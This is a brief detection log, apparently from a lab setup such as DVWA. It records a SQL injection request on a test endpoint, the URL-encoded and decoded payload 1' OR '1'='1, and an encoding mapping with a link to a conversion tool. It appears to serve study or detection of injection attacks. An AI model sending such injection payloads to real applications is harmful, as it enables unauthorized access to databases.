#
```
Date/Time: 2020-07-29T08:26:00+00:00
Vulnerability: xss csrf sqli id lfi
Request: /vulnerabilities/sqli/?id=1%27+or+%271%27%3D%271&Submit=Submit
Variable: REQUEST.id=1' or '1'='1 GET.id=1' or '1'='1
IP: 172.17.0.2 
```
```
1%27+or+%271%27%3D%271

1' OR '1'='1

URLDECODE
https://tool.chinaz.com/tools/urlencode.aspx
'  ===> %27
=  ====> %3D
```
